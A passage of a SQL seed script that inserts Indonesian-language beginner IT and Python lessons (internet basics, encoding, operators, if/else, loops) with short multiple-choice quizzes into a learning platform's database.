> Luangkan waktu memahami dasar IT sebelum lanjut ke pemrograman.', '🔀', false, '[{"question":"Perintah untuk membuat repository Git baru?","options":["git start","git init","git new","git create"],"answer":1,"explanation":"git init membuat repository Git baru di direktori saat ini."},{"question":"Apa fungsi ''git commit -m''?","options":["Upload ke server","Menyimpan perubahan ke history dengan pesan","Membuat branch","Menghapus file"],"answer":1,"explanation":"git commit -m menyimpan snapshot perubahan yang sudah di-stage ke history dengan pesan commit."},{"question":"Perintah untuk mengirim perubahan ke remote repository?","options":["git send","git push","git upload","git remote"],"answer":1,"explanation":"git push mengirim commit lokal ke remote repository seperti GitHub."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('dasar-internet-web', 1, 9, 'Dasar Internet & Web', 'dasar-internet-web', 'Cara kerja internet: client-server, browser, URL, dan protokol.', '# Dasar Internet & Web


![Dasar Internet & Web](https://sfile.chatglm.cn/images-ppt/02ebffcc571f.jpg)

**Internet** adalah jaringan global yang menghubungkan miliaran perangkat. Memahami cara kerja internet penting bagi siapapun yang ingin terjun di dunia web development atau cybersecurity.

## Cara Kerja Internet

```text
[Browser/Client] --HTTP/HTTPS--> [Server] --query--> [Database]
      |                                |
      +---- DNS resolve domain -------+
```

Saat Anda mengetik URL, browser melakukan DNS lookup untuk menerjemahkan domain ke IP address, lalu mengirim request HTTP ke server, server memproses dan mengembalikan response (HTML/CSS/JS) yang dirender browser.

## Komponen Penting

```text
1. Client   - browser/app yang membuat request
2. Server   - komputer yang menyajikan resource
3. Protocol - aturan komunikasi (HTTP, HTTPS, FTP)
4. DNS      - Domain Name System, penerjemah domain->IP
5. URL      - alamat resource (https://example.com/path)
6. IP       - alamat unik perangkat di jaringan
```

## Anatomi URL

Setiap bagian URL punya fungsi spesifik. Berikut contoh dan bagiannya:

```text
URL: https://www.example.com:443/blog/post?id=10#section

- https     -> scheme (protokol)
- www...com -> domain (host)
- 443       -> port
- /blog/post-> path
- id=10     -> query string
- section   -> fragment (anchor)
```

## HTTP Methods

```bash
GET     - mengambil data
POST    - mengirim data baru
PUT     - update seluruh resource
PATCH   - update sebagian resource
DELETE  - hapus resource

# Test request dengan curl
curl https://api.example.com/users
curl -X POST -d ''{"name":"Budi"}'' https://api.example.com/users
```

## Status Code HTTP

```text
1xx Informational
2xx Success       (200 OK, 201 Created)
3xx Redirection   (301, 302)
4xx Client Error  (400 Bad, 401 Unauth, 404 Not Found)
5xx Server Error  (500 Internal, 503 Service Unavailable)
```

Internet bekerja berkat ribuan kabel bawah laut, satelit, dan data center yang saling terhubung membentuk jaringan global. Protokol seperti TCP/IP memastikan data sampai utuh dan berurutan, sementara HTTPS menambah enkripsi TLS agar data tidak bisa disadap. Saat belajar web, pahami juga konsep cookie, session, dan caching yang mempengaruhi cara aplikasi web menyimpan state dan mempercepat loading. Browser developer tools atau F12 adalah senjata utama untuk inspeksi request, response, header, dan performa halaman web Anda secara mendalam.

> **Tips:** Pahami HTTP dengan baik. Semua komunikasi web — dari browser, API, hingga serangan web — berbasis protokol HTTP.



## Studi Kasus di Dunia Nyata

Bayangkan Anda bekerja di perusahaan startup. Anda berurusan dengan komputer, server, cloud storage, dan network.

## Tips Memulai

> Luangkan waktu memahami dasar IT sebelum lanjut ke pemrograman.', '🌐', false, '[{"question":"Apa fungsi DNS?","options":["Mengirim email","Menerjemahkan domain ke IP address","Menyimpan file","Melindungi dari virus"],"answer":1,"explanation":"DNS (Domain Name System) menerjemahkan nama domain seperti google.com menjadi IP address yang dipahami komputer."},{"question":"HTTP method untuk mengambil data dari server adalah?","options":["POST","GET","DELETE","PUT"],"answer":1,"explanation":"GET digunakan untuk mengambil/membaca data dari server tanpa mengubah state server."},{"question":"Status code HTTP yang berarti ''Not Found'' adalah?","options":["200","301","404","500"],"answer":2,"explanation":"404 Not Found berarti resource yang diminta tidak ditemukan di server."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('sistem-bilangan-encoding', 1, 10, 'Sistem Bilangan & Encoding', 'sistem-bilangan-encoding', 'Binary, hex, ASCII, Unicode - representasi data di komputer.', '# Sistem Bilangan & Encoding


![Sistem Bilangan & Encoding](https://sfile.chatglm.cn/images-ppt/26f868bc9643.jpg)

Komputer hanya memahami angka **0 dan 1** (binary). Semua data — teks, gambar, video — direpresentasikan dalam bentuk bilangan biner. Memahami sistem bilangan dan encoding adalah fondasi penting dalam IT dan cybersecurity.

## Sistem Bilangan

```text
Decimal  (base 10) : 0,1,2,3,4,5,6,7,8,9
Binary   (base 2)  : 0,1
Octal    (base 8)  : 0-7
Hex      (base 16) : 0-9, A-F
```

## Konversi Bilangan

```python
# Konversi di Python
print(bin(255))    # ''0b11111111''
print(hex(255))    # ''0xff''
print(int(''1010'', 2))   # 10 (binary to decimal)
print(int(''FF'', 16))    # 255 (hex to decimal)
print(oct(64))     # ''0o100''
```

## ASCII & Unicode

**ASCII** adalah encoding 7-bit untuk 128 karakter (huruf, angka, simbol dasar). **Unicode** (UTF-8) adalah standar modern yang mendukung jutaan karakter termasuk emoji dan aksara non-Latin.

```python
# ASCII dan Unicode di Python
print(ord(''A''))        # 65 (kode ASCII)
print(chr(65))         # ''A''
print(ord(''😍''))       # 128525 (Unicode)

# String ke bytes
text = "Halo"
print(text.encode(''utf-8''))   # b''Halo''
```

## Hex di Dunia Nyata

Hexadecimal sering digunakan karena lebih ringkas dari binary. Warna HTML (`#FF5733`), MAC address, IPv6, dan hash kriptografi semuanya ditulis dalam hex.

```text
#FF5733  -> warna RGB (255, 87, 51)
00:1A:2B:3C:4D:5E -> MAC address
2001:0db8::1 -> IPv6
```

## Bit dan Byte

```text
1 bit   = 0 atau 1
1 byte  = 8 bit  (256 nilai: 0-255)
1 KB    = 1024 byte
1 MB    = 1024 KB
1 GB    = 1024 MB
```

Konsep bit dan byte menjadi dasar ukuran data di komputer. File 1 MB sebenarnya adalah sekitar satu juta byte atau delapan juta bit. Dalam kriptografi, panjang kunci diukur dalam bit: kunci AES-256 berarti 256 bit, yang berarti 2 pangkat 256 kemungkinan kunci — angka yang lebih besar dari jumlah atom di alam semesta yang teramati. Inilah yang membuat enkripsi modern sangat sulit dipecahkan. Memahami binary dan hex juga membantu saat membaca memory dump, network packet, atau menganalisis malware di low level.

> **Tips:** Saat debugging jaringan atau malware, Anda akan sering melihat data dalam hex. Latih kemampuan membaca hex — ini skill penting di cybersecurity.



## Studi Kasus di Dunia Nyata

Bayangkan Anda bekerja di perusahaan startup. Anda berurusan dengan komputer, server, cloud storage, dan network.

## Tips Memulai

> Luangkan waktu memahami dasar IT sebelum lanjut ke pemrograman.', '🔢', false, '[{"question":"Berapa nilai decimal dari biner ''1010''?","options":["8","10","12","5"],"answer":1,"explanation":"1010 biner = 8+0+2+0 = 10 decimal."},{"question":"Apa kepanjangan ASCII?","options":["American Standard Code for Information Interchange","Advanced Symbol Code","Automatic System Character","American Symbol Code"],"answer":0,"explanation":"ASCII = American Standard Code for Information Interchange, encoding 7-bit untuk 128 karakter."},{"question":"Berapa bit dalam 1 byte?","options":["4","8","16","32"],"answer":1,"explanation":"1 byte terdiri dari 8 bit, sehingga bisa merepresentasikan 256 nilai (0-255)."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('pengenalan-pemrograman', 2, 1, 'Pengenalan Pemrograman', 'pengenalan-pemrograman', 'Apa itu programming, algoritma, dan cara berpikir komputasional.', '# Pengenalan Pemrograman


![Pengenalan Pemrograman](https://sfile.chatglm.cn/images-ppt/99fa98a727a9.jpg)

**Pemrograman (programming)** adalah seni memberi instruksi kepada komputer untuk menyelesaikan suatu masalah. Inti dari programming bukan mengetik kode, melainkan **berpikir komputasional** untuk memecah masalah menjadi langkah-langkah logis.

## Apa Itu Algoritma?

Algoritma adalah urutan langkah terstruktur untuk menyelesaikan masalah. Bayangkan resep masakan: ada urutan bahan dan langkah yang menghasilkan hidungan akhir.

```text
Algoritma membuat teh:
1. Didihkan air
2. Masukkan teh ke gelas
3. Tuang air panas
4. Tambahkan gula
5. Aduk dan sajikan
```

## Cara Berpikir Komputasional

Empat pilar berpikir komputasional:

```text
1. Decomposition     - pecah masalah besar jadi kecil
2. Pattern Recognition - cari pola berulang
3. Abstraction       - fokus hal penting, abaikan detail
4. Algorithm Design  - susun langkah penyelesaian
```

## Contoh Sederhana

```python
# Program menghitung rata-rata
nilai = [80, 75, 90, 65, 85]
total = sum(nilai)
rata_rata = total / len(nilai)
print(f"Rata-rata: {rata_rata}")

if rata_rata >= 75:
    print("Lulus")
else:
    print("Tidak lulus")
```

## Tahap Membuat Program

```text
1. Pahami masalah
2. Rancang algoritma (flowchart/pseudocode)
3. Tulis kode (coding)
4. Test dan debug
5. Optimasi dan dokumentasi
```

Pemrograman melatih pola pikir logis dan sistematis yang berguna bahkan di luar coding. Mulailah dengan proyek kecil yang relevan: kalkulator, to-do list, atau program konversi satuan. Bangun kebiasaan menulis pseudocode sebelum kode sesungguhnya untuk memperjelas algoritma. Saat menemui bug, jangan panik — gunakan teknik seperti print debugging, baca pesan error dengan teliti, dan pecah masalah menjadi bagian lebih kecil. Belajar dari kesalahan adalah bagian normal dan tak terhindarkan dari menjadi programmer. Konsistensi berlatih setiap hari, meski hanya 30 menit, jauh lebih efektif daripada belajar maraton sekali seminggu. Manfaatkan platform seperti LeetCode atau HackerRank untuk melatih algoritma, dan baca kode orang lain di GitHub untuk memperluas wawasan. Bergabunglah dengan komunitas programmer untuk diskusi dan saling membantu saat menemui kesulitan.

> **Tips:** Jangan langsung coding. Pikirkan dulu algoritmanya di kertas atau pseudocode. 80% pekerjaan programmer adalah berpikir, 20% mengetik kode.



## Studi Kasus: Membangun Aplikasi

Saat membangun aplikasi to-do list, Anda menggunakan variabel, array, function, loop, dan if/else.

## Tips Belajar

> Kode setiap hari, minimal 30 menit.', '💡', false, '[{"question":"Apa itu algoritma?","options":["Bahasa pemrograman","Urutan langkah terstruktur menyelesaikan masalah","Software khusus","Jenis komputer"],"answer":1,"explanation":"Algoritma adalah urutan langkah logis dan terstruktur untuk menyelesaikan suatu masalah."},{"question":"Berikut yang BUKAN pilar berpikir komputasional adalah?","options":["Decomposition","Pattern Recognition","Compilation","Abstraction"],"answer":2,"explanation":"Empat pilar berpikir komputasional: Decomposition, Pattern Recognition, Abstraction, dan Algorithm Design. Compilation bukan termasuk."},{"question":"Tahap pertama dalam membuat program adalah?","options":["Menulis kode","Menguji program","Memahami masalah","Optimasi"],"answer":2,"explanation":"Memahami masalah adalah langkah pertama. Tanpa memahami masalah, kita tidak bisa merancang solusi yang tepat."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('bahasa-pemrograman-populer', 2, 2, 'Bahasa Pemrograman Populer', 'bahasa-pemrograman-populer', 'Python, JavaScript, Java, C++ - kapan menggunakan masing-masing.', '# Bahasa Pemrograman Populer


![Bahasa Pemrograman Populer](https://sfile.chatglm.cn/images-ppt/db8eb4afe425.jpg)

Ada ratusan bahasa pemrograman, masing-masing dengan kekuatan dan use case berbeda. Memilih bahasa yang tepat bergantung pada tujuan: web, mobile, game, data science, atau sistem.

## Bahasa Populer & Kegunaannya

```text
Bahasa       | Kegunaan Utama
-------------|--------------------------
Python       | Data science, AI, backend, scripting
JavaScript   | Web frontend & backend (Node.js)
Java         | Enterprise, Android
C++          | Game, sistem, high-performance
C#           | Game (Unity), Windows app
Go           | Backend, microservice, cloud
Rust         | Sistem, safety, performance
PHP          | Web backend
SQL          | Database query
```

## Python: Bahasa Pemula Terbaik

Python populer karena sintaks mirip bahasa Inggris, mudah dibaca, dan ekosistem luas (NumPy, Pandas, Django, Flask).

```python
print("Halo Dunia!")
nama = input("Nama kamu siapa? ")
print(f"Senang bertemu, {nama}!")
```

## JavaScript: Raja Web

JavaScript wajib dikuasai untuk web development. Berjalan di browser dan server (Node.js).

```javascript
console.log("Halo Dunia!");
let nama = prompt("Nama kamu siapa?");
alert("Senang bertemu, " + nama);
```

## Java: Stabil untuk Enterprise

Java berjalan di JVM (Java Virtual Machine), strongly typed, dan banyak dipakai di perusahaan besar.

```java
public class Hello {
    public static void main(String[] args) {
        System.out.println("Halo Dunia!");
    }
}
```

## Cara Memilih Bahasa

```text
- Web frontend -> JavaScript/TypeScript
- Web backend  -> Python, JS, Go, PHP, Java
- Data/AI      -> Python, R
- Mobile       -> Swift (iOS), Kotlin (Android), Dart (Flutter)
- Game         -> C++, C#
- Sistem       -> C, C++, Rust
```

Tidak ada bahasa terbaik mutlak — semua tergantung konteks. Untuk pemula, fokus satu bahasa dulu hingga menguasai konsep inti: variabel, tipe data, kontrol flow, function, dan struktur data. Setelah itu, belajar bahasa kedua jauh lebih mudah karena konsepnya mirip. Perhatikan juga paradigma: bahasa imperatif seperti C dan Python, object-oriented seperti Java dan C#, functional seperti Haskell dan Elixir, serta multi-paradigma seperti JavaScript dan Rust. Memahami beberapa paradigma membuat Anda jadi programmer lebih fleksibel. Terakhir, ikuti tren industri namun jangan terburu-buru pindah bahasa hanya karena hype — kuasai dulu yang Anda pakai.

> **Tips:** Kuasai satu bahasa dengan baik dulu. Konsep pemrograman (variabel, loop, function) universal — sekali paham, mudah berpindah ke bahasa lain.



## Studi Kasus: Membangun Aplikasi

Saat membangun aplikasi to-do list, Anda menggunakan variabel, array, function, loop, dan if/else.

## Tips Belajar

> Kode setiap hari, minimal 30 menit.', '🗣️', false, '[{"question":"Bahasa paling populer untuk Data Science dan AI adalah?","options":["Java","Python","C++","PHP"],"answer":1,"explanation":"Python mendominasi Data Science dan AI berkat library seperti NumPy, Pandas, dan TensorFlow."},{"question":"Bahasa wajib untuk web frontend?","options":["Python","Java","JavaScript","C++"],"answer":2,"explanation":"JavaScript adalah satu-satunya bahasa yang berjalan native di browser, menjadikannya wajib untuk web frontend."},{"question":"Bahasa yang direkomendasikan untuk pemula?","options":["Assembly","Python","C++","Rust"],"answer":1,"explanation":"Python direkomendasikan untuk pemula karena sintaks sederhana, mirip bahasa Inggris, dan mudah dibaca."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('python-dasar', 2, 3, 'Python Dasar', 'python-dasar', 'Instalasi Python, print, input, dan program pertama Hello World.', '# Python Dasar


![Python Dasar](https://sfile.chatglm.cn/images-ppt/75bd99a38ebe.jpg)

**Python** adalah bahasa pemrograman high-level yang populer karena mudah dipelajari, ekspresif, dan punya ekosistem luas. Python digunakan untuk web, automation, data science, AI, dan banyak lagi.

## Instalasi Python

```bash
# Cek versi Python
python --version       # Windows
python3 --version      # Linux/macOS

# Menjalankan file Python
python3 hello.py

# Mode interaktif (REPL)
python3
>>> print("Halo")
```

## Hello World

```python
# Program pertama
print("Halo Dunia!")
print("Belajar Python itu menyenangkan")
```

## Variabel dan Input

```python
# Input dari user
nama = input("Siapa nama kamu? ")
umur = int(input("Berapa umur kamu? "))

# Output dengan f-string
print(f"Halo {nama}!")
print(f"Tahun depan umurmu {umur + 1} tahun")

# Beberapa tipe data
nama = "Budi"        # string
umur = 20            # integer
tinggi = 170.5       # float
mahasiswa = True     # boolean
```

## Operator Dasar

```python
a = 10
b = 3

print(a + b)    # 13 (penjumlahan)
print(a - b)    # 7  (pengurangan)
print(a * b)    # 30 (perkalian)
print(a / b)    # 3.333 (pembagian)
print(a // b)   # 3  (pembagian bulat)
print(a % b)    # 1  (modulo/sisa)
print(a ** b)   # 1000 (pangkat)
```

## Komentar

```python
# Ini komentar satu baris

"""
Ini komentar
multi-baris (docstring)
"""
```

Python punya filosofi The Zen of Python yang menekankan keterbacaan dan kesederhanaan. Ketik import this di interpreter untuk membacanya. Python juga terkenal dengan library standar yang kaya: os untuk operasi sistem, datetime untuk tanggal, json untuk parsing JSON, dan banyak lagi. Untuk menjalankan script Python, gunakan perintah python3 namafile.py. Untuk project serius, gunakan virtual environment (venv) agar dependency tiap project terisolasi dan tidak bentrok. IDE populer untuk Python antara lain VS Code, PyCharm, dan Jupyter Notebook untuk data science.

Python juga punya REPL interaktif yang berguna untuk eksperimen cepat dan mengevaluasi ekspresi tanpa harus membuat file script terlebih dahulu, sehingga sangat cocok untuk belajar dan prototyping.

> **Tips:** Python menggunakan indentasi (spasi) untuk blok kode, bukan kurung kurawal. Konsisten gunakan 4 spasi per level indentasi.



## Studi Kasus: Membangun Aplikasi

Saat membangun aplikasi to-do list, Anda menggunakan variabel, array, function, loop, dan if/else.

## Tips Belajar

> Kode setiap hari, minimal 30 menit.', '🐍', false, '[{"question":"Fungsi untuk menampilkan output di Python?","options":["echo()","console.log()","print()","printf()"],"answer":2,"explanation":"print() adalah fungsi bawaan Python untuk menampilkan output ke layar."},{"question":"Fungsi untuk menerima input dari user?","options":["scan()","input()","get()","read()"],"answer":1,"explanation":"input() membaca input dari user sebagai string. Gunakan int()/float() untuk konversi ke angka."},{"question":"Apa output ''10 // 3'' di Python?","options":["3.33","3","4","1"],"answer":1,"explanation":"Operator // adalah pembagian bulat (floor division), sehingga 10 // 3 = 3."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('variabel-tipe-data', 2, 4, 'Variabel & Tipe Data', 'variabel-tipe-data', 'Variabel, tipe data primitif: int, float, string, boolean.', '# Variabel & Tipe Data


![Variabel & Tipe Data](https://sfile.chatglm.cn/images-ppt/9ce74a4875e6.jpg)

**Variabel** adalah wadah untuk menyimpan data. **Tipe data** menentukan jenis nilai yang bisa disimpan. Memahami keduanya adalah fondasi pemrograman.

## Variabel di Python

```python
# Deklarasi variabel (dinamis, tanpa tipe eksplisit)
nama = "Andi"
umur = 25
tinggi = 168.5
mahasiswa = True

# Multiple assignment
a, b, c = 1, 2, 3
x = y = 10

# Konvensi penamaan: snake_case
nama_lengkap = "Budi Santoso"
harga_total = 50000
```

## Tipe Data Primitif

```python
# Integer (bilangan bulat)
umur = 25
tahun = 2024

# Float (bilangan desimal)
pi = 3.14159
berat = 65.5

# String (teks)
nama = "Budi"
pesan = ''Halo''
multi = """Teks
multi baris"""

# Boolean (True/False)
aktif = True
selesai = False
```

## Konversi Tipe (Type Casting)

```python
# String ke int/float
umur_str = "25"
umur = int(umur_str)       # 25
harga = float("99.5")      # 99.5

# Angka ke string
teks = str(100)            # "100"

# Cek tipe data
print(type(umur))          # <class ''int''>
print(type(nama))          # <class ''str''>
```

## Operasi String

```python
nama = "Budi"
depan = "Budi"
belakang = "Santoso"

# Concatenation
print(depan + " " + belakang)   # Budi Santoso

# f-string
print(f"Halo, {depan} {belakang}!")

# Method string
print(nama.upper())        # BUDI
print(nama.lower())        # budi
print(len(nama))           # 4
print("Halo Dunia".replace("Dunia", "Python"))  # Halo Python
```

Python mendukung dynamic typing, artinya tipe variabel ditentukan saat runtime dan bisa berubah. Sejak Python 3.5, Anda bisa menambahkan type hint opsional untuk dokumentasi dan static checker seperti mypy. Type hint tidak mengubah behavior runtime, namun sangat membantu di project besar untuk menangkap bug lebih awal. Pahami juga mutable vs immutable: list dan dict mutable (bisa diubah), sementara tuple, str, dan int immutable. Mengubah string akan membuat objek string baru, bukan memodifikasi yang lama, sehingga operasi string bisa boros memori jika dilakukan berulang dalam loop.

> **Tips:** Python dinamis sehingga variabel bisa berganti tipe. Namun, untuk kode yang jelas, jaga konsistensi tipe agar tidak membingungkan.



## Studi Kasus: Membangun Aplikasi

Saat membangun aplikasi to-do list, Anda menggunakan variabel, array, function, loop, dan if/else.

## Tips Belajar

> Kode setiap hari, minimal 30 menit.', '📦', false, '[{"question":"Tipe data untuk bilangan desimal di Python?","options":["int","float","decimal","double"],"answer":1,"explanation":"float menyimpan bilangan desimal seperti 3.14 atau 0.5."},{"question":"Apa output dari ''str(100)'' di Python?","options":["100","''100''","Error","100.0"],"answer":1,"explanation":"str(100) mengkonversi integer 100 menjadi string ''100''."},{"question":"Fungsi untuk mengecek tipe data di Python?","options":["typeof()","type()","datatype()","gettype()"],"answer":1,"explanation":"type() mengembalikan tipe data dari suatu objek, misalnya type(5) -> <class ''int''>."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('operator-ekspresi', 2, 5, 'Operator & Ekspresi', 'operator-ekspresi', 'Operator aritmatika, perbandingan, logika, dan assignment.', '# Operator & Ekspresi


![Operator & Ekspresi](https://sfile.chatglm.cn/images-ppt/966ef2c7a2d4.jpg)

**Operator** adalah simbol yang melakukan operasi pada nilai/variabel. **Ekspresi** adalah kombinasi nilai, variabel, dan operator yang menghasilkan nilai baru.

## Operator Aritmatika

```python
a = 10
b = 3

print(a + b)    # 13  penjumlahan
print(a - b)    # 7   pengurangan
print(a * b)    # 30  perkalian
print(a / b)    # 3.333 pembagian
print(a // b)   # 3   pembagian bulat
print(a % b)    # 1   modulo (sisa)
print(a ** b)   # 1000 pangkat
```

## Operator Perbandingan

Menghasilkan nilai boolean `True` atau `False`.

```python
x = 5
y = 10

print(x == y)   # False (sama dengan)
print(x != y)   # True  (tidak sama)
print(x > y)    # False (lebih besar)
print(x < y)    # True  (lebih kecil)
print(x >= 5)   # True  (lebih besar atau sama)
print(x <= 4)   # False (lebih kecil atau sama)
```

## Operator Logika

```python
a = True
b = False

print(a and b)  # False  (keduanya True)
print(a or b)   # True   (salah satu True)
print(not a)    # False  (negasi)

# Kombinasi
umur = 20
print(umur >= 17 and umur <= 65)  # True
```

## Operator Assignment

```python
x = 10       # assignment
x += 5       # x = x + 5  -> 15
x -= 3       # x = x - 3  -> 12
x *= 2       # x = x * 2  -> 24
x /= 4       # x = x / 4  -> 6.0
x %= 4       # x = x % 4  -> 2.0
```

## Prioritas Operator

```text
1. ()           - kurung
2. **           - pangkat
3. * / // %     - perkalian/pembagian
4. + -          - penjumlahan/pengurangan
5. == != > <    - perbandingan
6. not and or   - logika
```

> **Tips:** Jika ragu urutan operasi, gunakan tanda kurung. Kode yang eksplisit lebih mudah dibaca danhindari bug logika.



## Studi Kasus: Membangun Aplikasi

Saat membangun aplikasi to-do list, Anda menggunakan variabel, array, function, loop, dan if/else.

## Tips Belajar

> Kode setiap hari, minimal 30 menit.', '➕', false, '[{"question":"Operator modulo (%) menghasilkan?","options":["Hasil bagi","Sisa pembagian","Pangkat","Pembulatan"],"answer":1,"explanation":"Operator modulo (%) menghasilkan sisa pembagian, misalnya 10 % 3 = 1."},{"question":"Apa hasil dari ''True and False''?","options":["True","False","Error","None"],"answer":1,"explanation":"Operator ''and'' menghasilkan True hanya jika kedua operand True. Karena False, hasilnya False."},{"question":"Operator untuk pangkat di Python?","options":["^","**","//","pow"],"answer":1,"explanation":"Di Python, operator pangkat adalah ** (contoh: 2 ** 3 = 8). Simbol ^ adalah XOR di Python, bukan pangkat."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('struktur-kontrol-if-else', 2, 6, 'Struktur Kontrol If/Else', 'struktur-kontrol-if-else', 'Pengambilan keputusan dengan if, elif, else dan nested condition.', '# Struktur Kontrol If/Else


![Struktur Kontrol If/Else](https://sfile.chatglm.cn/images-ppt/c4138a6bf0fb.png)

**Struktur kontrol** memungkinkan program mengambil keputusan berdasarkan kondisi. `if/else` adalah fondasi logika dalam pemrograman.

## Sintaks Dasar

```python
umur = 18

if umur >= 17:
    print("Dewasa")
else:
    print("Belum dewasa")
```

## If / Elif / Else

```python
nilai = 75

if nilai >= 90:
    grade = "A"
elif nilai >= 80:
    grade = "B"
elif nilai >= 70:
    grade = "C"
elif nilai >= 60:
    grade = "D"
else:
    grade = "E"

print(f"Grade kamu: {grade}")
```

## Kondisi Gabungan

```python
umur = 25
punya_sim = True

# AND - kedua kondisi harus True
if umur >= 17 and punya_sim:
    print("Boleh mengemudi")
else:
    print("Tidak boleh mengemudi")

# OR - salah satu True cukup
hari = "Sabtu"
if hari == "Sabtu" or hari == "Minggu":
    print("Weekend!")
```

## Nested If (If bersarang)

```python
umur = 20
punya_ktp = True

if umur >= 17:
    if punya_ktp:
        print("Buat SIM")
    else:
        print("Buat KTP dulu")
else:
    print("Belum cukup umur")
```

## Conditional Expression (Ternary)

```python
umur = 20
status = "Dewasa" if umur >= 17 else "Anak"
print(status)  # Dewasa
```

## Match Case (Python 3.10+)

```python
hari = "Senin"
match hari:
    case "Senin" | "Selasa" | "Rabu" | "Kamis" | "Jumat":
        print("Hari kerja")
    case "Sabtu" | "Minggu":
        print("Weekend")
    case _:
        print("Tidak valid")
```

Logika kondisional adalah jantung dari hampir semua program. Saat menulis if/else bertingkat yang dalam (lebih dari 3 level), pertimbangkan untuk refactor dengan guard clause atau early return, atau memecah ke function terpisah agar kode lebih mudah dibaca. Hindari juga negasi ganda yang membingungkan. Untuk validasi input, gunakan pola fail-fast: cek kondisi invalid lebih dulu dan return atau tolak, lalu tulis logic utama tanpa nested if. Kode yang rata atau flat umumnya lebih mudah dipahami daripada kode yang bersarang dalam, dan mengurangi risiko bug logika yang sulit dilacak.

> **Tips:** Perhatikan indentasi! Python menggunakan indentasi (4 spasi) untuk blok. Salah indentasi = syntax error atau logic error.



## Studi Kasus: Membangun Aplikasi

Saat membangun aplikasi to-do list, Anda menggunakan variabel, array, function, loop, dan if/else.

## Tips Belajar

> Kode setiap hari, minimal 30 menit.', '🔀', false, '[{"question":"Kapan blok ''else'' dieksekusi?","options":["Selalu","Jika semua kondisi if/elif False","Jika kondisi if True","Tidak pernah"],"answer":1,"explanation":"Blok else dieksekusi ketika semua kondisi if dan elif sebelumnya bernilai False."},{"question":"Kata kunci untuk multiple condition di Python?","options":["else if","elseif","elif","elsif"],"answer":2,"explanation":"Python menggunakan ''elif'' (singkatan else if) untuk multiple condition."},{"question":"Indentasi yang benar di Python?","options":["2 spasi","4 spasi (standar)","Tab saja","Tidak perlu indentasi"],"answer":1,"explanation":"PEP 8 (style guide Python) merekomendasikan 4 spasi per level indentasi."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('perulangan-loop', 2, 7, 'Perulangan / Loop', 'perulangan-loop', 'For loop, while loop, break, continue, dan nested loop.', '# Perulangan / Loop


![Perulangan / Loop](https://sfile.chatglm.cn/images-ppt/a9bb2941d047.jpg)

**Loop** memungkinkan menjalankan blok kode berulang. Tanpa loop, kita harus menulis kode yang sama berkali-kali. Python punya dua loop utama: `for` dan `while`.

## For Loop

```python
# Iterasi list
buah = ["apel", "mangga", "jeruk"]
for b in buah:
    print(b)

# Iterasi range
for i in range(5):
    print(i)        # 0,1,2,3,4

for i in range(1, 6):
    print(i)        # 1,2,3,4,5

for i in range(0, 10, 2):
    print(i)        # 0,2,4,6,8 (step 2)
```

## While Loop

```python
# While dengan counter
i = 0
while i < 5:
    print(i)
    i += 1

# While dengan kondisi
password = ""
while password != "rahasia":
    password = input("Masukkan password: ")
print("Akses diberikan!")
```

## Break dan Continue

```python
# Break - hentikan loop sepenuhnya
for i in range(10):
    if i == 5:
        break
    print(i)    # 0,1,2,3,4

# Continue - lewati iterasi ini
for i in range(10):
    if i % 2 == 0:
        continue
    print(i)    # 1,3,5,7,9 (ganjil saja)
```

## Nested Loop

```python
# Tabel perkalaan
for i in range(1, 4):
    for j in range(1, 4):
        print(f"{i} x {j} = {i*j}")
    print("---")
```

## Enumerate dan Zip

```python
# Enumerate - index + value
buah = ["apel", "mangga", "jeruk"]
for i, b in enumerate(buah):
    print(f"{i}: {b}")

# Zip - iterasi dua list paralel
nama = ["Andi", "Budi", "Citra"]
nilai = [80, 75, 90]
for n, val in zip(nama, nilai):
    print(f"{n} mendapat {val}")
```

Pilih loop yang tepat: for ketika jumlah iterasi diketahui (misal iterasi list), while ketika iterasi bergantung kondisi yang berubah (misal menunggu input). Hindari while True tanpa kondisi keluar yang jelas, karena berisiko infinite loop. Untuk operasi pada list, Python menyediakan list comprehension yang ringkas dan cepat, misalnya membuat kuadrat bilangan genap dalam satu baris. Tools seperti enumerate, zip, dan sorted sangat membantu menulis loop yang ekspresif. Selalu pastikan loop memiliki kondisi terminasi yang pasti agar program tidak menggantung dan menghabiskan resource.

> **Tips:** Hindari mengubah list saat di-iterasi. Gunakan list comprehension atau buat copy untuk menghindari bug tak terduga.



## Studi Kasus: Membangun Aplikasi

Saat membangun aplikasi to-do list, Anda menggunakan variabel, array, function, loop, dan if/else.

## Tips Belajar

> Kode setiap hari, minimal 30 menit.', '🔁', false, '[{"question":"Apa output ''for i in range(3): print(i)''?","options":["1 2 3","0 1 2","0 1 2 3","1 2"],"answer":1,"explanation":"range(3) menghasilkan 0, 1, 2 (3 elemen mulai dari 0)."},{"question":"Apa fungsi ''break'' dalam loop?","options":["Lewati iterasi","Hentikan loop sepenuhnya","Lanjut iterasi berikutnya","Pause loop"],"answer":1,"explanation":"break menghentikan loop sepenuhnya dan keluar dari blok loop."},{"question":"Fungsi ''enumerate()'' dalam for loop?","options":["Membalik list","Memberi index + value","Mengurutkan list","Menghitung total"],"answer":1,"explanation":"enumerate() menghasilkan tuple (index, value) sehingga kita dapat keduanya saat iterasi."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('function-modular-code', 2, 8, 'Function & Modular Code', 'function-modular-code', 'Membuat function, parameter, return value, dan scope.', '# Function & Modular Code


